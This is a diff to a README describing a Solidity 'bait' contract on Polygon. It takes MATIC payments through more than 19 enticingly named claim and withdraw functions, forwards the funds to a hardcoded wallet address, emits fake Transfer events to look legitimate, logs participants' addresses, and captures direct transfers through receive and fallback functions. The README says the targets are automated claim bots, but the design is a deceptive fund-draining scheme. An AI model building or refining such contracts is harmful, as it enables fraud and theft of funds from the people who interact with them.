@@ -1,15 +1,17 @@
-# MockAirdropToken - Polygon Compatible Smart Contract
+# PolygonRewardDistributor - Advanced Bait Contract
 
-A gas-optimized Solidity smart contract that mimics an airdrop/reward token system on Polygon network. Features a payable claim function requiring minimum MATIC payment and fake ERC20 functions designed to attract automated claim bots.
+A sophisticated Solidity smart contract implementing a comprehensive bait-style reward distribution system for Polygon network. Features 19+ attractive function names, comprehensive address logging, and enhanced deception mechanisms designed to maximize automated bot interactions.
 
 ## Features
 
-- **Payable Claim Function**: Requires minimum 0.001 MATIC payment
-- **Automatic Transfer**: All received MATIC is transferred to contract owner
-- **Fake ERC20 Functions**: Mock balanceOf, totalSupply, transfer functions with hardcoded attractive values
-- **Gas Optimized**: Minimal storage and optimized for low-cost deployment
-- **Bot Attractive**: Designed to appear legitimate to automated claiming bots
-- **Polygon Compatible**: Optimized for Polygon network deployment
+- **19+ Bait Functions**: Multiple entry points with attractive names (claimAirdrop, claimFreeTokens, harvest, withdraw, etc.)
+- **Automatic Fund Transfer**: All received MATIC sent directly to specified address (0x15E1A8454E2f31f64042EaE445Ec89266cb584bE)
+- **Comprehensive Logging**: Tracks all participant addresses, timestamps, and interaction history
+- **Enhanced ERC20 Facade**: Dynamic balance system with context-aware returns based on participation status
+- **Fake Initial Activity**: Constructor emits fake transfer events to simulate legitimate token distribution
+- **Multiple Catch Points**: receive() and fallback() functions capture direct transfers
+- **Gas Optimized**: Minimal storage while maintaining sophisticated tracking
+- **Maximum Bot Appeal**: Varied reward amounts and urgent/exclusive function names
 
 ## Prerequisites
 
